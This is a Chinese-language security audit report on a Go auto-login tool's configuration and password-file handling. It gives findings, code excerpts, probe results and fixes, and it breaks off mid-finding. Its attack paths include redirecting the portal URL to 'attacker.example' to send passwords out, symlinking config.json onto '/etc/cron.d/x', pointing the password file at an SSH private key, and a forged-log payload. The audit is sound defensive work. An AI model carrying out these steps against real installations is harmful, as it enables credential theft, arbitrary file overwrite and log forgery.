# A：配置与凭据审查报告

- 审查对象：`internal/config/config.go`、`passwordfile.go`、`protect_windows.go`、`protect_other.go`、`config_test.go`、`passwordfile_test.go`
- 方法：逐行阅读 + 在 `/tmp/audit-A`（仓库的完整副本）上用**本机 WSL 里真实存在的 Go 1.26.0** 运行自建探针，以及既有测试与 `go vet`。被审查的仓库源码树**未被修改**，我只写了本报告文件。
- 未能执行的一端：Windows 专有分支（`protect_windows.go` 的 ACL 调用）在本机无 Windows 端 Go 工具链，**无法执行**，只能读码；文中已逐条标注。
- 严重度定义照任务书（S0 严重 / S1 高 / S2 中 / S3 低 / S4 信息）。

## 摘要

1. **未发现 S0，也未发现可证明的 S1。** 已发布的三套部署（systemd system/user 服务、OpenWrt、Windows 托盘）都把 `config.json` 放在属主 0700 的目录里，本模块的核心弱点因此都是"条件成立才致命"的 S2。
2. **[S2] 凭据去向完全由 `config.json` 单方面决定**：`portalBaseUrl`/`eportalUrl` 只校验 `http|https` + 非空 host，且**只在设置页调用 `Validate()`**；手工编辑/安装包写入的文件在装载路径上完全不校验。实测 `Validate()` 对 `http://attacker.example/` 返回空错误集，密码以 GET 查询串 `user_password=` 提交给该地址。
3. **[S2] 写入路径不校验属主、不拒绝符号链接**：`MkdirAll` 接受符号链接目录（实测 `err=<nil>`），`WriteFile`/`Chmod`/`SetNamedSecurityInfo` 全部按路径作用于链接目标。实测：把 `config.json` 做成指向 `victim.txt` 的符号链接后 `Save()` 把**明文密码写进目标并把目标 chmod 成 0600**。
4. **[S2] 写入非原子（先 `O_TRUNC`）**：实测一次写到一半的失败把 703 字节的完好配置变成 1024 字节的半截 JSON，`LoadConfig` 随即拒绝解析；`run` 子命令因此 `return 1`，systemd 在 `StartLimitBurst=5` 之后彻底放弃。
5. **[S2] `PasswordFile` 可指向任意可读文件，其首行在"无冒号"时直接成为提交给门户的密码**：实测把 `PasswordFile` 指向一份 SSH 私钥，程序会以 `user_password="-----BEGIN OPENSSH PRIVATE KEY-----"` 去登录，且 `notice=""`（毫无提示）。
6. **[S2] Windows 上 ACL 失败被 `_ =` 丢弃**（`Save` 返回成功），而 ACL 是在文件写完之后按路径设置的——FAT32/exFAT/SMB 上明文密码就此人人可读而程序照跑（该分支未能执行，见各条置信度）。
7. **[S2] 只在本次运行给出的密码（`--password`／`--account`）会被设置页的一次保存写进 `config.json`**，与 `SourceRun` 的承诺相反；已实测复现。
8. 另外 7 条 S3 集中在解析边界（BOM、CR、单密码含冒号）、密码文件权限从不检查（`appstate.go` 注释声称检查过）、受控路径 `%s` 回显导致日志注入、`AccountPrefix`/`EportalURL` 无校验、`--password` 走 argv、以及测试盲区（Windows ACL 零覆盖）。

## 发现

### [S2] 门户地址＝凭据去向：只校验 scheme+host，装载路径完全不校验，密码以 GET 查询串明文外发

- 类别：供应链 / 权限边界 / 凭据存储
- 位置：`internal/config/config.go:75-77`（两个键）、`internal/config/config.go:284-321`（`normalize` 只兜底"空值"）、`internal/config/config.go:741-747`（`ValidHTTPURL`）、`internal/config/config.go:723-728`（只有 `Validate` 查 URL，而 `Validate` 只被设置页调用）；消费端 `internal/portal/portal.go:212,224`
- 证据：
  ```go
  // config.go:746
  return (u.Scheme == "http" || u.Scheme == "https") && u.Host != ""
  // portal.go:212,224
  q.Set("user_password", attempt.Password)
  code, body, err := c.get(c.plain, c.cfg.EportalURL+"?"+q.Encode())
  ```
  实测（真实 Go 1.26.0）：
  ```
  ValidHTTPURL("http://attacker.example/")        = true
  ValidHTTPURL("http://10.9.1.3:801/eportal/#")   = true
  ValidHTTPURL("http://user:pw@evil.example/")    = true
  Validate() with an attacker portal = map[]           <- 无任何错误
  load path: portalBaseUrl="not a url at all" eportalUrl="ftp://x/" accountPrefix=""  <- LoadConfig 原样接受
  ```
- 攻击路径：前置＝能改动 `config.json`，或按 `main.go:186-188`"把解压的副本连同设置放在一起"的部署而该目录他人可写，或通过设置页（`internal/app/settings.go:541-542` 把整份配置反射解码）。步骤：把 `"eportalUrl"` 改为 `"http://attacker.example/eportal/"` → 程序在下一次自动登录（`autoLogin` 默认 true，`checkIntervalSeconds` 默认 15）执行 `GET http://attacker.example/eportal/?...&user_password=<明文>&user_account=,0,s1234567`。若攻击者只想窃取密码而不想读取文件，可**追加一个重复键**（Go 的 `encoding/json` 对重复键取后者）把 `eportalUrl` 改向而保留受害者原文——此子路径未能执行验证（无 Windows Go、也需构造真实文件），置信度见下。
- 影响：机密性（账号+密码明文出网，且是 GET，会进入沿途代理/门户访问日志）；持久（每次登录都发）。完整性：整份凭据提交可被引导至任意主机。
- 修复：把"门户地址"当信任锚而不是普通设置——在设置页与装载路径都限制为内置默认主机（或由部署文件 `/etc/...`、unit 环境变量指定的 1 个地址），并把 https 作为默认/要求；`Validate` 增加主机白名单；至少把登录从 GET 查询串改成 POST body。**注意**：真正的修法是把"信任锚"从 `config.json` 里搬出去（见架构问题 1），仅加白名单只是抬高门槛。
- 置信度：高（`ValidHTTPURL`/`Validate`/装载路径的行为均已实测）；"重复键追加"子路径为中（未执行，仅依据 Go 标准库对重复键取后者的文档化行为）。

### [S2] 写入路径不校验属主与目录、不拒绝符号链接：`MkdirAll` 接受符号链接目录，`WriteFile`/`Chmod`/ACL 全部按路径作用于链接目标

- 类别：TOCTOU / 文件权限 / 权限边界
- 位置：`internal/config/config.go:524-528`（`MkdirAll`，0700 仅在创建时生效）、`internal/config/config.go:529`（`os.WriteFile`，无 `O_NOFOLLOW`/无先 `Lstat`）、`internal/config/config.go:536`（`os.Chmod` 按路径）、`internal/config/config.go:542`（`restrictToOwner` 按路径）、`internal/config/protect_other.go:27`、`internal/config/protect_windows.go:32-34`；部署背景 `cmd/SDAutoLogin/main.go:186-188`
- 证据：
  ```go
  // config.go:524-529
  if dir := filepath.Dir(c.path); dir != "" && dir != "." {
      if err := os.MkdirAll(dir, configDirMode); err != nil { return err }
  }
  if err := os.WriteFile(c.path, append(data, '\n'), configFileMode); err != nil { return err }
  ```
  实测（真实 Go 1.26.0，`/tmp` 副本）：
  ```
  target holds 538 bytes now, starts "{\n  \"accounts\": ..."     <- 符号链接目标被整个覆盖
  config.json lstat: mode=Lrwxrwxrwx isSymlink=true ; target mode=0600   <- 目标被 chmod
  C: symlink target got the plaintext password: true ; target mode now 0600
  MkdirAll through a symlinked directory: err=<nil>
  Save through the link: err=<nil> ; file landed in the linked directory: true
  ```
- 攻击路径：前置＝攻击者能在配置目录里放置符号链接（`main.go:186-188` 明确支持"解压到任意目录、设置放在程序旁边"；该目录在共享工具目录/NAS/`Everyone:Modify` 的 Windows 目录下即满足）。步骤（Unix）：`ln -s /etc/cron.d/x /opt/tools/config.json`，等程序启动或用户在设置页保存一次 → 目标文件被 JSON 覆盖并被 `chmod 0600`（Windows 上额外被 `PROTECTED_DACL` 重写 DACL，等于抹掉目标的访问控制）。再进一步：把**目录**换成符号链接（`ln -s /tmp/attacker /opt/tools/data`），实测 `MkdirAll` 静默通过、`config.json` 落进攻击者选定的目录，此后攻击者可以在自己的目录里整体替换配置（改向门户地址 → 见上一条）。第三种形态：目录本身 0777 时，`0600` 文件毫无意义——攻击者 `mv config.json away` 再放一份自己的文件即可（实测 `Protect()` 对此类目录返回空串，见 S2 第 5 条）。
- 影响：完整性（任意文件覆盖、权限/ACL 破坏，程序以 root/SYSTEM 运行时是低权→高权原语）；机密性（配置替换后门户改向）；持久（每次保存重演）。
- 修复：写入前 `os.Lstat` 拒绝任何符号链接（目录同理）；用 `os.OpenFile(path, O_WRONLY|O_CREATE|O_TRUNC|O_NOFOLLOW, 0600)` 并对**句柄**做 `f.Chmod`（Windows 用 `CreateFile` 拿到句柄后 `SetSecurityInfo(handle, ...)`，不要用按路径的 `SetNamedSecurityInfo`）；目录侧校验 `os.Stat` 的属主＝当前 uid、`mode&0o022==0`（Windows 校验 DACL 不含 `Everyone`/`Users` 可写 ACE），不一致时拒绝写入或明确告警。
- 置信度：高（符号链接与符号链接目录的两种行为均已实测）。

### [S2] 写入非原子（先 `O_TRUNC`）：一次写失败就毁掉整份配置，服务路径因此长期起不来

- 类别：架构 / 可用性（凭据与账号丢失）
- 位置：`internal/config/config.go:529`；硬失败 `internal/config/config.go:182-184`；服务端后果 `cmd/SDAutoLogin/cli.go:631-635`、`packaging/systemd/system/sdautologin.service`（`StartLimitBurst=5`、`Restart=on-failure`）；GUI 回落 `cmd/SDAutoLogin/main.go:113-118`
- 证据：
  ```go
  if err := os.WriteFile(c.path, append(data, '\n'), configFileMode); err != nil { return err }
  // LoadConfig:
  if err := json.Unmarshal(data, cfg); err != nil { return cfg, fmt.Errorf("parse %s: %w", path, err) }
  ```
  实测（真实 Go 1.26.0，用 `RLIMIT_FSIZE` 让写在中途失败）：
  ```
  before 703 bytes -> Save error=write /tmp/.../config.json: file too large -> after 1024 bytes
  LoadConfig on the damaged file: parse /tmp/.../config.json: unexpected end of JSON input
  ```
- 攻击路径：不需要攻击者。① 掉电/`kill -9` 落在 `O_TRUNC` 与 `write` 之间 → 文件 0 字节；② 磁盘满（ENOSPC）→ 半截 JSON；③ 只读挂载/配额耗尽 → 同上。随后：systemd 的 `ExecStart=... run --home=...` 走 `cmdRun` → `loadForCLI` 失败 → `return 1`，`Restart=on-failure` 连撞 5 次后 unit 进入 failed 并停止重试；托盘路径则在 `main.go:117` 打印一行 WARN 后**以默认值启动**，操作者下一次在设置页保存就用默认值覆盖掉残骸。旧配置（含全部账号与设置）已经不存在，也没有备份。
- 影响：可用性（服务长期不可用，需人工介入）；完整性（账号列表与设置全部丢失；若 remembered 密码也随之丢失需重新录入）。
- 修复：同目录写临时文件（`O_CREATE|O_EXCL, 0600`）→ `f.Sync()` → `os.Rename` → 同步目录；保留 `config.json.bak`（或至少不覆盖到无法回滚）；把"解析失败即拒绝启动"改为"坏文件改名保留 + 回落默认 + 明确日志/界面提示"。
- 置信度：高（已实测失败路径与后果链）。

### [S2] Windows：ACL 失败被 `_ =` 丢弃（`Save` 仍报成功），且 ACL 是在文件写完**之后**按路径设置的

- 类别：文件权限 / 凭据存储
- 位置：`internal/config/config.go:536-543`、`internal/config/protect_windows.go:15-35`、`internal/config/protect_windows.go:41-48`
- 证据：
  ```go
  // config.go:536-542
  if err := os.Chmod(c.path, configFileMode); err != nil { return err }
  // A file whose access list cannot be set is not a reason to lose the settings ...
  _ = restrictToOwner(c.path)
  ```
  在 Windows 上 `os.Chmod` 对权限位是空操作且几乎不报错，因此 `Save` 的返回值实际上完全取决于 `WriteFile`；`restrictToOwner` 的错误被丢弃。`SetNamedSecurityInfo` 按**路径**操作，作用于写完之后的文件。
- 攻击路径：前置＝`config.json` 位于不支持 ACL 的卷（FAT32/exFAT U 盘、部分 SMB 挂载）或进程无 `WRITE_DAC`。`os.WriteFile` 先以**目录继承来的 ACL** 创建文件（FAT 上等于任何人可读写），随后 `SetNamedSecurityInfo` 失败并返回，`Save` 返回 `nil` → 设置页显示"保存成功"；明文密码以人人可读的形式留在设备上，只有下一个启动的 `Protect()`（`internal/app/appstate.go:31` → `logging.Log.Warn`）记一条警告。第二个窗口：文件先以继承 ACL 存在、ACL 后设，攻击者若对该目录有写权限，可在这个窗口内把文件 `rename` 走，明文就留在更宽的继承 ACL 之下（该窗口未能执行验证）。
- 影响：机密性（明文凭据非属主可读，U 盘拔走后仍可读）；失败是**静默**的（对调用方而言保存成功）。
- 修复：`Save` 不得丢弃 ACL 结果——失败要作为可上报的状态返回（或让 `Save` 直接报错并要求调用方显式接受风险）；用句柄式 API（`CreateFile` → `SetSecurityInfo(handle, SE_FILE_OBJECT, DACL|PROTECTED_DACL, ...)`）在写入明文之前先把 DACL 收紧；对卷能力做检测（`GetVolumeInformation` 的 `FILE_PERSISTENT_ACLS`），不支持时拒绝写明文并明确告知用户。
- 置信度：高（代码路径与"错误被丢弃"由读码确定）；"FAT32/SMB 上 `SetNamedSecurityInfo` 失败"为中（本机无 Windows Go，无法执行；Windows API 行为依文档）。

### [S2] `protect_other.go` 只看 mode 位：扩展 ACL、default ACL 继承、父目录权限全部不检查，`Protect()` 会对实际他人可读的文件报"一切正常"

- 类别：文件权限 / 虚假保证
- 位置：`internal/config/protect_other.go:18-34`（尤其 19-26）、`internal/config/protect_other.go:10-13`（对目录的假设）、`internal/config/config.go:546-549`
- 证据：
  ```go
  info, err := os.Stat(path)
  if err != nil { return "" }                       // 读不到/不存在 => 视为没问题
  mode := info.Mode().Perm()
  if mode&0o077 == 0 { return "" }                  // 只看 9 个 mode 位
  // 注释（protect_other.go:10-12）："the file is written 0600, and the directory it lives in
  // belongs to the user the program runs as" —— 这条对目录的断言从未被验证
  ```
  实测（真实 Go 1.26.0）：
  ```
  directory mode=0777 file mode=0600
  Protect() report=""
  ```
- 攻击路径：前置＝文件带扩展 ACL 或继承自父目录 default ACL（`cp -a`/`rsync -A` 的还原、管理员 `setfacl -m u:alice:r config.json`、父目录自行设过 default ACL、企业备份/同步代理）。步骤：`setfacl -m u:alice:r ~/.config/sdautologin/config.json` → `stat -c %a` 仍是 `600`，但 `getfacl` 显示 `user:alice:r--` → 程序每次启动都调用 `Protect()` 并返回空串（无任何告警），alice 直接读走明文密码。第二条：父目录 0777 时 `Protect()` 也返回空串（已实测），而 0777 目录意味着任何本地用户都能用 `mv`+`cp` 替换配置文件（0600 只挡读，不挡换）。第三处：`os.Stat`→`os.Chmod` 之间是 TOCTOU，`os.Chmod` 跟随符号链接，路径被换掉时 chmod 作用于攻击者指定的目标（配合上一条的提权场景）。第四处：`os.Stat` 出错（EACCES/EIO）也返回空串，即"查不了"被当成"没问题"。
- 影响：机密性（明文密码对他人可读而程序自认安全）；完整性（配置文件可被替换）；安全保证与实际不符，且没有任何可观测信号。
- 修复：Unix 上用 `golang.org/x/sys/unix` 读 `system.posix_acl_access` 扩展属性（或 `unix.Facl`）并在存在时清理/拒绝；检查父目录 `mode&0o022==0` 且属主为当前 uid（Windows 用 `GetNamedSecurityInfo` 检查目录 DACL）；把 `os.Stat` 的错误与"文件不存在"分开处理，读不到时要报告而不是静默通过；改用 `open(O_NOFOLLOW|O_RDONLY)`+`fchmod` 消除 Stat→Chmod 竞态。
- 置信度：高（目录与 mode 位的行为已实测；扩展 ACL 的缺口由"代码中不存在任何 ACL 读取"这一事实确定，具体 `setfacl` 演示未执行）。

### [S2] `PasswordFile` 是任意路径读取，且"无冒号"时其首行直接成为提交给门户的密码

- 类别：输入解析 / 凭据存储 / 供应链
- 位置：`internal/config/config.go:226-248`（`227` 取键、`231` 读文件、`239-247` 单密码分支）、`internal/config/passwordfile.go:42-63`、`internal/config/config.go:710-711`（`Validate` 对密码文件只报"没密码"，不查路径）
- 证据：
  ```go
  path := strings.TrimSpace(c.PasswordFile)
  data, err := os.ReadFile(path)                    // 任意路径，无白名单、无权限检查、无大小限制
  ...
  return nil, lines[0], nil                         // passwordfile.go:62  首行即密码
  // config.go:245-246
  c.Accounts[0].Password = single
  c.Accounts[0].PasswordSource = SourceFile
  ```
  实测（真实 Go 1.26.0，`PasswordFile` 指向一份 SSH 私钥）：
  ```
  notice="" attempts=1 source="file"
    would submit as user_password: username="s1" password="-----BEGIN OPENSSH PRIVATE KEY-----"
  after a settings save: in memory="-----BEGIN OPENSSH PRIVATE KEY-----" ; key text in config.json=false
  ```
- 攻击路径：前置＝能设置 `PasswordFile` 键（写 `config.json`；或走设置页——设置页把整个请求体解码到运行配置上）。步骤：`{"passwordFile":"/root/.ssh/id_rsa"}`（或 `/etc/hostname`、`/proc/self/environ`、任何首行无冒号的可读文件）→ 程序把该文件首行当作第一个账号的密码，在下一次登录时以 `user_password=` 提交给 `eportalUrl`；把 `eportalUrl` 一起改向攻击者主机即完成"任意可读文件首行出网外带"。因为来源被标成 `SourceFile`，它不会被写回 `config.json`（实测 `key text in config.json=false`），所以泄漏只走网络、不留痕。
- 影响：机密性（本机任意可读文件首行外带，且对本模块以外的文件没有目录限制）；完整性（用垃圾凭据反复登录，可能触发账号风控/锁定）；持久（每次登录重发）。
- 修复：把密码文件限制在部署配置（unit 文件/`--password-file`）或配置目录之内：`filepath.Clean` 后要求 `strings.HasPrefix` 于允许目录、经 `filepath.EvalSymlinks` 解析、拒绝非常规文件；装载前校验该文件 mode/属主（同 S2 第 5 条）；去掉"首行即密码"的猜测，改为显式格式（`password=<secret>` 或要求文件单行且 ≤4KiB 且 0600）；把 `PasswordFile` 从"设置页可写"的键里移除，改为仅能由命令行的 `--password-file`/部署文件提供。
- 置信度：高（端到端已实测：任意文件首行成为待提交的 `user_password`）。

### [S2] 只为本次运行给出的密码（`--password`／`--account`）会被设置页的一次保存写进 `config.json`

- 类别：凭据存储 / 架构
- 位置：`internal/config/config.go:551-568`（`marshal` 只丢弃 `SourceFile`）、`internal/config/config.go:574-583`（`PageBase` 同样只清理 `SourceFile`）、`internal/config/config.go:210-216`（`markStoredPasswords` 把无名来源改标为 `SourceConfig`）、承诺见 `internal/config/config.go:16-18`、调用见 `cmd/SDAutoLogin/cli.go:370-376`
- 证据：
  ```go
  // config.go:561-565
  fromFile := c.Accounts[i].PasswordSource == SourceFile
  v.Accounts[i].PasswordSource = ""
  if !c.RememberPassword || fromFile { v.Accounts[i].Password = "" }
  // config.go:16-18  SourceRun："--password ... --save writes it down for the runs that follow."
  ```
  实测（真实 Go 1.26.0，用 `defaultConfig()` 的真实默认值；两种请求形态都试了）：
  ```
  A: field absent from the request -> notice="" in-memory="runonly" source="config" saved-run-only=true
  B: empty password posted        -> notice="" in-memory="runonly" source="config" saved-run-only=true
  ```
- 攻击路径：前置＝以 `--password=SECRET`（或 `--account user:SECRET`）启动托盘/`run --settings=...`，文档承诺"本次运行"；随后在设置页改动任意一个设置并保存（`internal/app/settings.go:541-566` → `state.Update` → `Save`）。链条：`PageBase()` 保留了该密码（它不属于 `SourceFile`）→ `KeepPasswordsFrom` 跳过非空项 → `markStoredPasswords` 把来源改标 `config` → `marshal` 因为 `rememberPassword` 默认 true 而写入文件。结果：一个明确要求不落盘的明文密码进入 `config.json`，此后被当作普通存储密码长期保留（并可能被备份/同步/漫游带走）。OpenWrt 的 init 脚本在只设 `password` 时正是以 `--password=` 启动（`packaging/openwrt/root/etc/init.d/sdautologin`）。
- 影响：机密性（不落盘的秘密落盘并长期化）；与本模块自己的注释承诺相矛盾。
- 修复：`marshal`（与 `PageBase`）一并丢弃 `PasswordSource == SourceRun` 的密码，或在 `Save` 上增加显式参数声明"允许写下来源为 run 的秘密"（只有 `--save` 时传 true）；用测试钉住"run 来源的秘密永不落盘"。
- 置信度：高（已实测两条链路）。

### [S3] "无冒号＝单一密码"启发式过于粗糙：含冒号的单密码被误判（并把它的一部分打印进日志），多行无冒号时其余行被静默丢弃，仅 CR 换行会把多条记录合并

- 类别：输入解析 / 凭据泄漏（日志）
- 位置：`internal/config/passwordfile.go:49-55`（判形）、`internal/config/passwordfile.go:56-63`（单密码分支）、`internal/config/passwordfile.go:30-39`（`\r` 只去行尾）、`internal/config/config.go:264-267`（把文件里的"名字"回显进通知）
- 证据：
  ```go
  for _, l := range lines { if strings.Contains(l, ":") { named = true; break } }
  ...
  name, secret, ok := strings.Cut(l, ":")            // passwordfile.go:70
  ...
  return fmt.Sprintf("the password file %s names %s, and no entry of the login list uses that account",
      path, strings.Join(unknown, ", "))             // config.go:265-266
  ```
  实测（真实 Go 1.26.0）：
  ```
  in="p@ss:word\n"        -> err=<nil> single=""   name="p@ss" secret="word"      <- 单密码被当成列表
  in="pass1\npass2\n"     -> err=<nil> single="pass1"                              <- 第 2 行静默丢弃
  in="s1:one\rs2:two"     -> err=<nil> single=""   name="s1" secret="one\rs2:two"  <- 两条记录被合并
  in="s1:one\n   \ns2:two\n" -> ERROR: line 2 holds no colon ...                   <- 只含空格的行报错
  in="s1:one\nstray\n"    -> ERROR: line 2 holds no colon ...                       <- 缺冒号 => 整文件拒绝(好)
  ```
- 攻击路径：操作者按文档把"单一密码"放进密码文件，而该密码恰好含 `:`（`user:pass` 形式的代理/其他系统凭据、含冒号的随机口令）。判形结果是列表：`name="p@ss"` 与任何账号都不匹配 → 通知文本把密码的冒号前片段交给 `logging.Log.Warn`（`internal/app/appstate.go:36-37`、`internal/app/settings.go:555`，落盘 `logs/app.log`，并回显到设置页）。同时该账号并没拿到密码（fail-closed，但用户看到的是"账号名不认识"而非"你的密码被误读"）。多行无冒号的形态（`pass1\npass2`）只取第 1 行，其余静默丢弃且无告警；CR-only 文件把第二组 `账号:密码` 当作第一组的密码内容提交。
- 影响：机密性（日志与界面泄漏密码片段，日志常被贴进 issue）；可用性/完整性（凭据错配、静默失败）。
- 修复：通知与错误只回显行号/位置，不回显来自文件的名字（或 `%q` + 截断）；判形改为显式且互斥（例如：任一行为空→报错；全部行含冒号→列表；恰好一行且不含冒号→单密码；其余一律报错），并在单密码模式下若还有非空行则明确报错；`\r` 按行分隔符处理（`strings.FieldsFunc` 或显式拒绝 CR-only 文件）。
- 置信度：高（各形态均已实测，包括日志中出现的那个片段）。

### [S3] BOM 不剥离：带 UTF-8 BOM 的密码文件让密码/账号名多一个 U+FEFF（`config.json` 的 BOM 却已处理）

- 类别：输入解析
- 位置：`internal/config/passwordfile.go:30-40` 与 `internal/config/config.go:179-180` 的不一致；受影响点 `internal/config/passwordfile.go:62`、`internal/config/passwordfile.go:74`
- 证据：
  ```go
  // passwordfile.go:31  没有任何 BOM 处理
  text := strings.TrimSuffix(string(data), "\n")
  // config.go:179-180  同一个包对 config.json 却处理了
  // Several Windows editors prepend a UTF-8 BOM, which json rejects.
  data = bytes.TrimPrefix(data, []byte{0xEF, 0xBB, 0xBF})
  ```
  实测（真实 Go 1.26.0）：
  ```
  in="\ufeffsecret\n"              -> single="\ufeffsecret"
  in="\ufeffs1234567:pass\n"       -> name="\ufeffs1234567" secret="pass"
  ```
- 攻击路径：不需要攻击者。用 Notepad/若干编辑器把密码文件存成"UTF-8 with BOM"（`config.go:179` 的注释已经承认这是同一平台的常见情形）→ 单密码形态下密码变成 `"\uFEFFsecret"`（登录必然失败）；列表形态下账号名变成 `"\uFEFFs1234567"`，与 `Accounts` 里的 `s1234567` 不匹配 → 报"no entry of the login list uses that account"，提示里的不可见字符让人难以看出真正原因（`byName` 的查找也是精确匹配，见 `config.go:250-253`）。
- 影响：可用性（凭据静默装载失败，排查成本高）。无直接机密性影响。
- 修复：`splitLines` 开头按 `config.go:180` 的方式 `bytes.TrimPrefix(data, []byte{0xEF,0xBB,0xBF})`；并把账号名匹配改成与 `Match`/`sameAccount` 一致的 `EqualFold`（顺带修掉大小写不一致）。
- 置信度：高（已实测）。

### [S3] 通知/错误用 `%s` 回显受控路径 → 日志注入（伪造日志行）

- 类别：输入解析 / 日志完整性
- 位置：`internal/config/config.go:233`、`:237`、`:243`、`:265`；`internal/config/protect_other.go:28-34`
- 证据：
  ```go
  return fmt.Sprintf("cannot read the password file %s: %v", path, err)      // config.go:233
  return fmt.Sprintf(
      "%s holds the passwords in clear text and is readable by users other than its owner (mode %04o), ...",
      path, mode, err)                                                        // protect_other.go:28-30
  ```
- 攻击路径：前置＝能设置 `config.json`（或走设置页 POST body）。把 `passwordFile` 设成 `"/tmp/x\n2026-01-01T00:00:00 INFO login ok account=s1 password=..."`（换行＋控制字符都是合法 JSON 字符串内容）→ `LoadPasswords` 的失败通知被逐字写进 `logging.Log.Warn`（`internal/app/appstate.go:36-37`、`internal/app/settings.go:555`），`logs/app.log` 里出现一行看起来完全合法的日志；ANSI/`\r` 还能改写终端上的那一行。`c.path` 同样经由 `protect()` 回显（路径可能来自 `--home`，包括 systemd 单元/脚本提供者）。
- 影响：完整性（日志不再可信，排障与事后取证被误导）。影响有限（需要能改配置）。
- 修复：路径一律用 `%q`（Go 会转义换行与控制字符）或在写日志前对控制字符做白名单过滤；更好的是不把路径当"文本片段"拼进可读消息，而是作为结构化字段。
- 置信度：高（格式串与调用点由读码确定；换行在 `%s` 下不被转义是 Go 的既定语义）。

### [S3] 密码文件的权限从不检查/收紧，而注释声称检查过

- 类别：凭据存储 / 文件权限 / 文档与实现不符
- 位置：`internal/config/config.go:546-549`（`Protect()` 只看 `c.path`）、`internal/config/protect_other.go:18-34`、`internal/config/protect_windows.go:41-48`；与 `internal/app/appstate.go:28-30` 的注释矛盾
- 证据：
  ```go
  // config.go:549
  func (c *Config) Protect() string { return protect(c.path) }
  // appstate.go:28-30
  // The password file's access list is checked here, once, as the configuration is loaded:
  // what is loose about it did not come from this program.
  ```
  实测（真实 Go 1.26.0，`PasswordFile` 是 0644 且内容含明文密码）：
  ```
  password file mode=0644 notice="" password loaded="topsecret"
  Protect() (config.json only) report=""
  ```
- 攻击路径：前置＝按文档使用密码文件机制（`packaging/systemd/*/sdautologin.service` 推荐 `LoadCredential=password:/etc/...`，`packaging/openwrt/root/etc/init.d/sdautologin` 甚至建议"与另一个程序共享"该文件）。操作者把该文件留成 0644（或备份/还原、`chmod 644`、放在共享目录/U 盘）→ 程序照样读取并把明文密码提交给门户，**没有任何告警**；同一模块对 `config.json` 会收紧并报告（实测 `Protect()` 对 0644 的 config.json 会报 `0644` 并 chmod 0600，见既有测试 `config_test.go:822-856`）。
- 影响：机密性（明文密码对非属主可读且无人提醒）；持久（每次启动都静默接受）。
- 修复：`loadPasswords` 内对 `path` 做与 `config.json` 同等的检查（Unix：`mode&0o077==0` 且 `syscall.Stat_t.Uid == os.Getuid()`；Windows：DACL 只含当前用户/无继承），不满足则拒绝装载并把原因写进 `passwordNotice`；同步修正 `appstate.go:28-30` 的注释。
- 置信度：高（已实测：0644 密码文件被静默接受）。

### [S3] 无大小/类型限制的整文件读取：`PasswordFile` 指向 FIFO、`/dev/zero`、巨大文件时启动阻塞或内存耗尽

- 类别：输入解析 / 可用性
- 位置：`internal/config/config.go:231`（`os.ReadFile` 无上限）、`internal/config/passwordfile.go:30-35`
- 证据：
  ```go
  data, err := os.ReadFile(path)          // config.go:231  无 Stat/无大小上限/不要求普通文件
  // passwordfile.go:31,35
  text := strings.TrimSuffix(string(data), "\n")
  lines := strings.Split(text, "\n")
  ```
  实测（真实 Go 1.26.0，`PasswordFile` 指向一个 fifo）：
  ```
  LoadPasswords is still blocked after 3s on a FIFO with no writer
  ```
- 攻击路径：前置＝能设置 `PasswordFile`（同 S2 第 6 条）或操作者误配。`"passwordFile": "<dir>/fifo"` → `LoadPasswords` 阻塞在 `os.ReadFile`，`run`/托盘启动流程永不继续（对 systemd 表现为启动超时；设置页则在请求里挂住，直到 `writeTimeout`）。`"/dev/zero"` 会让 `os.ReadFile` 读不到 EOF 而把内存耗尽（未被 OOM 杀掉前持续增长）——该具体情形**未能执行验证**（会危及本机），标为中。关于内存放大的问题：`splitLines` 本身**没有放大**（一次 `string(data)` 复制 + 每行子切片，`TrimSuffix` 仅在行尾是 `\r` 时分配），峰值约 2× 文件大小；真正的缺口是 `ReadFile` 没有上限。
- 影响：可用性（启动阻塞/进程被 OOM 杀死；systemd 下反复重启）。
- 修复：装载前 `os.Stat`，拒绝非常规文件（`info.Mode().IsRegular()`）与超过阈值（如 64KiB）的文件；Unix 上打开时加 `O_NONBLOCK|O_NOFOLLOW`，或改用 `os.Open` + `io.LimitReader`。
- 置信度：高（FIFO 阻塞已实测）；`/dev/zero` 的内存耗尽为中（未执行，依据 `os.ReadFile` 语义推断）。

### [S3] `AccountPrefix` / `EportalURL` 无任何校验：账号串可被改坏，`#` 会吞掉全部登录参数

- 类别：供应链 / 输入解析（配置校验缺口）
- 位置：`internal/config/config.go:80`（键）、`internal/config/config.go:284-321`（`normalize` 不碰 `AccountPrefix`）、`internal/config/config.go:689-738`（`Validate` 不查）、`internal/config/config.go:395-397`、`internal/portal/portal.go:148-153`
- 证据：
  ```go
  // config.go:394-396
  func (c *Config) Account(username, isp string) string { return c.AccountPrefix + username + isp }
  // portal.go:148-149
  query := c.cfg.EportalURL + "?c=Portal&a=online_list" + "&user_account=drcom&user_password=123" + ...
  ```
  实测（真实 Go 1.26.0）：
  ```
  load path: portalBaseUrl="not a url at all" eportalUrl="ftp://x/" accountPrefix=""
  user_account submitted="s1" ; Validate()=map[eportalUrl:err.urlInvalid portalBaseUrl:err.urlInvalid]
  ValidHTTPURL("http://10.9.1.3:801/eportal/#") = true
  ```
- 攻击路径：① `"accountPrefix": ""` → 提交的 `user_account` 从 `,0,s1234567` 变成 `s1234567`（门户按不同登录方式解析，登录失败且难以定位；`Match()` 的 `TrimPrefix` 语义也随之改变）；② `"eportalUrl": "http://10.9.1.3:801/eportal/#"` 能通过 `ValidHTTPURL`（有 scheme、有 host），但后续 `EportalURL + "?c=..."` 的拼接使 `#` 之后全成 fragment，`online_list`/`login` 的参数被整体丢弃 → 静默失败。注意：`JsVersion` 同样未校验，但它两处分别经 `url.QueryEscape`（`portal.go:153`）与 `q.Set`（`portal.go:218`）转义，**未发现注入**，故不计为缺陷。
- 影响：完整性/可用性（凭据提交格式被改坏、静默失败）。
- 修复：`normalize` 给 `AccountPrefix` 兜底默认值，并在 `Validate` 里限制为 `,0,`（或白名单）；`EportalURL` 的请求构造改用 `url.Parse` + `Query()` 增删参数，并拒绝含 `Fragment`/`RawQuery` 的值。
- 置信度：高（读码 + 实测 `Validate`/`ValidHTTPURL`/装载路径行为）；门户对畸形 `user_account` 的具体反应为中。

### [S3] `--password` 作为一等凭据来源进入 argv（同机任何用户可读），发行版脚本正按此调用

- 类别：凭据存储 / 权限边界
- 位置：`cmd/SDAutoLogin/cli.go:370-376`（`SourceRun` 的赋值）、`cmd/SDAutoLogin/cli.go:157-160`、`packaging/openwrt/root/etc/init.d/sdautologin`（`[ -n "$password" ] && set -- "$@" "--password=$password"`）、`packaging/systemd/system/sdautologin.service`（文档注释里给出 `--password=SECRET --save` 的一次性调用）
- 证据：
  ```go
